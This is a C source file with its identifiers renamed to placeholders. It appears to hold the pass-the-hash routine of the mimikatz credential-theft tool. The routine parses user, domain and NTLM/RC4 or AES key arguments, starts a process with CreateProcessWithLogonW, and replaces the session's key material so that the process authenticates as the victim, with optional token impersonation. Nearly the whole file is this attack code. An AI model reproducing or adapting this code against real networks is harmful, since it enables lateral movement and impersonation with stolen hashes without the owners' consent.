
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_11__ TYPE_4__ ;
typedef struct TYPE_10__ TYPE_3__ ;
typedef struct TYPE_9__ TYPE_2__ ;
typedef struct TYPE_8__ TYPE_1__ ;


typedef int wchar_t ;
typedef int tokenStats ;
struct TYPE_11__ {int hProcess; int hThread; int dwThreadId; int dwProcessId; } ;
struct TYPE_10__ {scalar_t__ isReplaceOk; int * Aes256Key; int * Aes128Key; int * NtlmHash; int member_4; int * member_3; int * member_2; int * member_1; TYPE_1__* member_0; } ;
struct TYPE_8__ {int LowPart; scalar_t__ HighPart; } ;
struct TYPE_9__ {TYPE_1__ AuthenticationId; } ;
typedef TYPE_2__ TOKEN_STATISTICS ;
typedef TYPE_3__ SEKURLSA_PTH_DATA ;
typedef TYPE_4__ PROCESS_INFORMATION ;
typedef int * PCWCHAR ;
typedef int NTSTATUS ;
typedef int HANDLE ;
typedef int DWORD ;
typedef int BYTE ;
typedef scalar_t__ BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (int ) ;
 scalar_t__ FUNC_1 (int ,int,int *,int ,int ,int *) ;
 int VAR_3 ;
 scalar_t__ FUNC_2 (int ,int ,TYPE_2__*,int,int *) ;
 int VAR_4 ;
 scalar_t__ VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 scalar_t__ VAR_8 ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int ,int ) ;
 scalar_t__ FUNC_5 (int ,int,int *) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (char*) ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 scalar_t__ FUNC_8 (int *,int ) ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 char* VAR_18 ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 (TYPE_3__*) ;
 scalar_t__ FUNC_11 (int ,int *,int ,int *,int ,int *,int *,char*,TYPE_4__*,int ) ;
 scalar_t__ FUNC_12 (int,int **,char*,int **,char*) ;
 scalar_t__ FUNC_13 (int *,int *,int) ;
 int FUNC_14 (int *,int,int ) ;
 int FUNC_15 (int *,int *,int ) ;

NTSTATUS FUNC_16(int VAR_19, wchar_t * VAR_20[])
{
 BYTE VAR_21[VAR_6], VAR_22[VAR_0], VAR_23[VAR_1];
 TOKEN_STATISTICS VAR_24;
 SEKURLSA_PTH_DATA VAR_25 = {&VAR_24.AuthenticationId, ((void*)0), ((void*)0), ((void*)0), VAR_3};
 PCWCHAR VAR_26, VAR_27, VAR_28, VAR_29, VAR_30, VAR_31, VAR_32 = ((void*)0);
 DWORD VAR_33;
 HANDLE VAR_34, VAR_35;
 PROCESS_INFORMATION VAR_36;
 BOOL VAR_37;

 if(FUNC_12(VAR_19, VAR_20, L"luid", &VAR_32, ((void*)0)))
 {
  VAR_24.AuthenticationId.HighPart = 0;
  VAR_24.AuthenticationId.LowPart = FUNC_15(VAR_32, ((void*)0), 0);
 }
 else
 {
  if(FUNC_12(VAR_19, VAR_20, L"user", &VAR_26, ((void*)0)))
  {
   if(FUNC_12(VAR_19, VAR_20, L"domain", &VAR_27, ((void*)0)))
   {
    VAR_37 = FUNC_12(VAR_19, VAR_20, L"impersonate", ((void*)0), ((void*)0));
#pragma warning(push)
#pragma warning(disable:4996)
 FUNC_12(VAR_19, VAR_20, L"run", &VAR_28, VAR_37 ? VAR_18 : L"cmd.exe");
#pragma warning(pop)
 FUNC_9(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", VAR_26, VAR_27, VAR_28, VAR_37 ? L"yes" : L"no");

   }
   else FUNC_6(L"Missing argument : domain\n");
  }
  else FUNC_6(L"Missing argument : user\n");
 }

 if(FUNC_12(VAR_19, VAR_20, L"aes128", &VAR_30, ((void*)0)))
 {
  if(VAR_8 >= VAR_5)
  {
   if(FUNC_13(VAR_30, VAR_22, VAR_0))
   {
    VAR_25.Aes128Key = VAR_22;
    FUNC_9(L"AES128\t: "); FUNC_14(VAR_25.Aes128Key, VAR_0, 0); FUNC_9(L"\n");
   }
   else FUNC_6(L"AES128 key length must be 32 (16 bytes)\n");
  }
  else FUNC_6(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
 }

 if(FUNC_12(VAR_19, VAR_20, L"aes256", &VAR_31, ((void*)0)))
 {
  if(VAR_8 >= VAR_5)
  {
   if(FUNC_13(VAR_31, VAR_23, VAR_1))
   {
    VAR_25.Aes256Key = VAR_23;
    FUNC_9(L"AES256\t: "); FUNC_14(VAR_25.Aes256Key, VAR_1, 0); FUNC_9(L"\n");
   }
   else FUNC_6(L"AES256 key length must be 64 (32 bytes)\n");
  }
  else FUNC_6(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
 }

 if(FUNC_12(VAR_19, VAR_20, L"rc4", &VAR_29, ((void*)0)) || FUNC_12(VAR_19, VAR_20, L"ntlm", &VAR_29, ((void*)0)))
 {
  if(FUNC_13(VAR_29, VAR_21, VAR_6))
  {
   VAR_25.NtlmHash = VAR_21;
   FUNC_9(L"NTLM\t: "); FUNC_14(VAR_25.NtlmHash, VAR_6, 0); FUNC_9(L"\n");
  }
  else FUNC_6(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
 }

 if(VAR_25.NtlmHash || VAR_25.Aes128Key || VAR_25.Aes256Key)
 {
  if(VAR_32)
  {
   FUNC_9(L"mode\t: replacing NTLM/RC4 key in a session\n");
   FUNC_10(&VAR_25);
  }
  else if(VAR_26)
  {
   if(FUNC_11(VAR_4, VAR_28, VAR_2, ((void*)0), VAR_7, VAR_26, VAR_27, L"", &VAR_36, VAR_3))
   {
    FUNC_9(L"  |  PID  %u\n  |  TID  %u\n",VAR_36.dwProcessId, VAR_36.dwThreadId);
    if(FUNC_5(VAR_36.hProcess, VAR_15 | (VAR_37 ? VAR_12 : 0), &VAR_34))
    {
     if(FUNC_2(VAR_34, VAR_17, &VAR_24, sizeof(VAR_24), &VAR_33))
     {
      FUNC_10(&VAR_25);
      if(VAR_25.isReplaceOk)
      {
       if(VAR_37)
       {
        if(FUNC_1(VAR_34, VAR_14 | VAR_13, ((void*)0), VAR_11, VAR_16, &VAR_35))
        {
         if(FUNC_8(((void*)0), VAR_35))
          FUNC_9(L"** Token Impersonation **\n");
         else FUNC_7(L"SetThreadToken");
         FUNC_0(VAR_35);
        }
        else FUNC_7(L"DuplicateTokenEx");
        FUNC_4(VAR_36.hProcess, VAR_10);
       }
       else FUNC_3(VAR_36.hProcess);
      }
      else FUNC_4(VAR_36.hProcess, VAR_9);
     }
     else FUNC_7(L"GetTokenInformation");
     FUNC_0(VAR_34);
    }
    else FUNC_7(L"OpenProcessToken");
    FUNC_0(VAR_36.hThread);
    FUNC_0(VAR_36.hProcess);
   }
   else FUNC_7(L"CreateProcessWithLogonW");
  }
  else FUNC_6(L"Bas user or LUID\n");
 }
 else FUNC_6(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");

 return VAR_10;
}
